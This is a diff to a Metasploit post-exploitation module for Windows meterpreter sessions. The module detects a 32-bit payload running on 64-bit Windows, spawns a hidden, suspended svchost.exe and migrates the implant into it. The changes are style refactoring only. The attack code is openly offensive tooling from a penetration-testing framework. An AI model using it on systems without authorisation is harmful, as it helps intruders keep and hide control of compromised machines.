@@ -5,28 +5,34 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Common
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'      => 'Architecture Migrate',
-      'Description'   => %q{This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a new process with the correct architecture and migrates into that process.},
-      'License'     => MSF_LICENSE,
-      'Author'    => ['Koen Riepe (koen.riepe@fox-it.com)'],
-      'References'  => [''],
-      'Platform'    => [ 'win' ],
-      'Arch'      => [ 'x86', 'x64' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name' => 'Architecture Migrate',
+      'Description' => %q(This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a
+                          new process with the correct architecture and migrates into that process.),
+      'License' => MSF_LICENSE,
+      'Author' => ['Koen Riepe (koen.riepe@fox-it.com)'],
+      'References' => [''],
+      'Platform' => [ 'win' ],
+      'Arch' => [ 'x86', 'x64' ],
+      'SessionTypes' => [ 'meterpreter' ]
+    )
+    )
 
-  register_options(
-  [
-    OptString.new('EXE', [true, 'The executable to start and migrate into', 'C:\windows\sysnative\svchost.exe']),
-    OptBool.new('FALLBACK', [ true, 'If the selected migration executable does not exist fallback to a sysnative file', true ])
-  ], self.class)
+    register_options(
+      [
+        OptString.new('EXE', [true, 'The executable to start and migrate into', 'C:\windows\sysnative\svchost.exe']),
+        OptBool.new('FALLBACK', [ true, 'If the selected migration executable does not exist fallback to a sysnative file', true ])
+      ],
+      self.class
+    )
   end
 
-  def is_32_bit_on_64_bits
+  def check_32_on_64
     begin
       apicall = session.railgun.kernel32.IsWow64Process(-1, 4)["Wow64Process"]
+      # railgun returns '\x00\x00\x00\x00' if the meterpreter process is 64bits.
       if apicall == "\x00\x00\x00\x00"
         migrate = false
       else
@@ -45,12 +51,12 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if is_32_bit_on_64_bits
+    if check_32_on_64
       print_status('The meterpreter is not the same architecture as the OS! Upgrading!')
       newproc = datastore['EXE']
       if exist?(newproc)
         print_status("Starting new x64 process #{newproc}")
-        pid = session.sys.process.execute(newproc, nil, {'Hidden' => true, 'Suspended' => true}).pid
+        pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
         print_good("Got pid #{pid}")
         print_status('Migrating..')
         session.core.migrate(pid)
@@ -66,7 +72,7 @@ class MetasploitModule < Msf::Post
           newproc = "#{windir}:\\windows\\sysnative\\svchost.exe"
           if exist?(newproc)
             print_status("Starting new x64 process #{newproc}")
-            pid = session.sys.process.execute(newproc, nil, {'Hidden' => true, 'Suspended' => true}).pid
+            pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
             print_good("Got pid #{pid}")
             print_status('Migrating..')
             session.core.migrate(pid)
